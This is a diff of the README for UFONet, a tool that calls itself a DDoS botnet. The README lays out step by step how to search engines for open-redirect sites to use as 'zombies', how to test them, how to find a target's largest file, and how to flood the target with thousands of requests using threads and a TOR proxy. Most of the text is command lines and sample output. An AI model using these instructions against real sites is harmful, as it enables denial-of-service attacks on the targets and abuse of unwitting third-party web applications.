@@ -9,7 +9,7 @@
 Y88b. .d88P 888       Y88b. .d88P 888   Y8888 Y8b.     Y88b.  
  'Y88888P'  888        'Y88888P'  888    Y888  'Y8888   'Y8888
 
-UFONet - DDoS attacks via Web Abuse - by psy 
+UFONet - DDoS Botnet via Web Abuse - by psy 
 
 =========================================================================== 
 
@@ -17,7 +17,7 @@ UFONet - DDoS attacks via Web Abuse - by psy
 # Project info
 ###############################
 
-Website: http://ufonet.sf.net
+Website: http://ufonet.03c8.net
 
 IRC: irc.freenode.net - #ufonet
 
@@ -25,8 +25,8 @@ IRC: irc.freenode.net - #ufonet
 # Summary
 ###############################
 
-UFONet - is a tool designed to launch DDoS attacks against a target, 
-using 'Open Redirect' vectors on third party web applications, like botnet.
+UFONet - is a tool designed to launch DDoS Botnet against a target, 
+using 'Open Redirect' vectors on third party web applications like botnet.
 
 See this links for more info:
 
@@ -40,24 +40,26 @@ See this links for more info:
 # Installing
 ###############################
 
-UFONet runs on many platforms.  It requires Python (2.x.y) and the following library:
+  UFONet runs on many platforms.  It requires Python (2.x.y) and the following libraries:
 
-    - python-pycurl - Python bindings to libcurl
+       python-pycurl - Python bindings to libcurl
+       python-geoip  - Python bindings for the GeoIP IP-to-country resolver library
 
-On Debian-based systems (ex: Ubuntu), run: 
+  On Debian-based systems (ex: Ubuntu), run: 
 
-    sudo apt-get install python-pycurl
+       sudo apt-get install python-pycurl python-geoip
 
-Source libs:
+  Source libs:
 
-    * Python: https://www.python.org/downloads/
-    * PyCurl: http://pycurl.sourceforge.net/
+       * Python: https://www.python.org/downloads/
+       * PyCurl: http://pycurl.sourceforge.net/
+       * PyGeoIP: https://pypi.python.org/pypi/GeoIP/
 
 ###############################
 # Searching for 'zombies'
 ###############################
 
-UFONet will search on google results for possible 'Open Redirect' vulnerable sites. 
+UFONet can dig on different search engines results to find possible 'Open Redirect' vulnerable sites. 
 A common query string should be like this:
 
         'proxy.php?url='
@@ -65,9 +67,33 @@ A common query string should be like this:
         'checklink?uri='
         'validator?uri='
 
-So for example, you can begin a search with:
+For example you can begin a search with:
 
        ./ufonet -s 'proxy.php?url='
+
+Or providing a list of "dorks" from a file:
+
+       ./ufonet --sd 'dorks.txt'
+
+By default UFONet will uses a search engine called 'duck'. But you can choose a different one:
+
+       ./ufonet -s 'proxy.php?url=' --se 'bing'
+
+This is the list of available search engines with last time that were working:
+
+        - duck [07/10/2015: OK!]
+        - google [07/10/2015: OK!]
+        - bing [07/10/2015: OK!]
+        - yahoo [07/10/2015: OK!]
+        - yandex [07/10/2015: OK!]
+
+You can also search massively using all search engines supported:
+
+       ./ufonet -s 'proxy.php?url=' --sa 
+
+To control how many 'zombies' recieve from search engines you can use:
+
+       ./ufonet --sd 'dorks.txt' --sa --sn 20
 
 At the end of the process, you will be asked if you want to check the list retrieved to see 
 if the urls are vulnerable.
@@ -78,13 +104,13 @@ Also, you will be asked to update the list adding automatically only 'vulnerable
 
        Wanna update your list (Y/n)
 
-If you reply 'Y', your new 'zombies' will be appended to the file named: zombies.txt
+If you reply 'Y' your new 'zombies' will be appended to the file named: zombies.txt
 
   -------------
   Examples:
 
      + with verbose:       ./ufonet -s 'proxy.php?url=' -v
-     + retrieve 15 urls:   ./ufonet -s 'proxy.php?url=' --sn 15
+     + with threads:       ./ufonet --sd 'dorks.txt' --sa --threads 100
 
 ###############################
 # Testing botnet
@@ -99,7 +125,11 @@ After that, launch it:
 
        ./ufonet -t zombies.txt
 
-At the end of the process, you will be asked if you want to update the list 
+You can order to 'zombies' to attack you and see how they reply to your needs using:
+
+       ./ufonet --attack-me 
+
+At the end of the process you will be asked if you want to update the list 
 adding automatically only 'vulnerable' web apps.
 
        Wanna update your list (Y/n)
@@ -117,33 +147,59 @@ If you reply 'Y', your file: zombies.txt will be updated.
 # Inspecting a target
 ###############################
 
-This option is useful to know the best place to attack your target.
-
-It will crawl your objetive to provide you with a URL path to the largest object (size) 
-found in the HTML code.
+This feature will provides you the biggest file on target:
 
        ./ufonet -i http://target.com
 
-Then, you will can drive your 'zombies' to reload just there, doing your most effective attack.
+You can use this when attacking to be more effective:
 
        ./ufonet -a http://target.com -b "/biggest_file_on_target.xxx"
+
+  -------------
+  Example:
+
+    +input:
+
+       ./ufonet -i http://target.com
+
+    +output:
+
+       [...]
+
+        +Image found: images/wizard.jpg
+	(Size: 63798 Bytes)
+	------------
+	+Style (.css) found: fonts.css
+	(Size: 20448 Bytes)
+	------------
+	+Webpage (.php) found: contact.php
+	(Size: 2483 Bytes)
+	------------
+	+Webpage (.php) found: about.php
+	(Size: 1945 Bytes)
+	------------
+	+Webpage (.php) found: license.php
+	(Size: 1996 Bytes)
+	------------
+	================================================================================
+	=Biggest File: http://target.com/images/wizard.jpg
+	================================================================================
 
 ###############################
 # Attacking a target
 ###############################
 
-Enter a target to attack, with the number of rounds that will be attacked:
+Enter a target to attack with a number of rounds:
 
        ./ufonet -a http://target.com -r 10
 
-This will attack the target, with the list of 'zombies' that your provided on: "zombies.txt", 
-a number of 10 times for each 'zombie'. That means, that if you have a list of 1.000 'zombies', 
-the program will launch 1.000 'zombies' x 10 rounds = 10.000 'hits' to the target.
+On this example UFONet will attacks the target a number of 10 times for each 'zombie'. That means that 
+if you have a list of 1.000 'zombies' it will launchs 1.000 'zombies' x 10 rounds = 10.000 requests to the target.
 
-By default, if you don't put any round, it will apply only 1.
+By default if you don't put any round it will apply only 1.
 
 Additionally, you can choose a place to recharge on target's site. For example, a large image, 
-a big size file or a flash movie. In some scenarios where targets doesn't use cache systems, 
+a big size file or a flash movie. In some scenarios where targets doesn't use cache systems 
 this will do the attack more effective.
 
        ./ufonet -a http://target.com -b "/images/big_size_image.jpg"
@@ -154,7 +210,7 @@ this will do the attack more effective.
      + with verbose:     ./ufonet -a http://target.com -r 10 -v
      + with proxy TOR:   ./ufonet -a http://target.com -r 10 --proxy="http://127.0.0.1:8118"
      + with a place:     ./ufonet -a http://target.com -r 10 -b "/images/big_size_image.jpg"
-     + with threads:     ./ufonet -a http://target.com -r 10 --threads 50
+     + with threads:     ./ufonet -a http://target.com -r 10 --threads 500
 
 ###############################
 # Updating
@@ -168,24 +224,28 @@ To check your version you should launch:
 
        ./ufonet --update
 
-This will update the tool automatically, removing all files from your old package.
+This will update the tool automatically removing all files from old package.
 
 ###############################
 # GUI/Web Interface
 ###############################
 
 You can manage UFONet using a Web interface. The tool has implemented a python web server 
-connected to the core, to provides you a more user friendly experience.
+connected to the core to provides you a more user friendly experience.
 
-To launch it, use:
+To launch it use:
 
       ./ufonet --gui
 
-This will open a tab on your default browser with all the options of the tool.
+This will open a tab on your default browser with all features of the tool and some 'extra' options.
 
 ###############################
 # Timelog
 ###############################
+
+--------------------------
+05.11.2015 : v.0.6b
+--------------------------
 
 --------------------------
 24.05.2015 : v.0.5b
@@ -217,7 +277,5 @@ This will open a tab on your default browser with all the options of the tool.
 
 - UFo & Mandingo & Ikujam
 ------------------------
-- People that doesn't say 'thanks'!
 
 ############
-
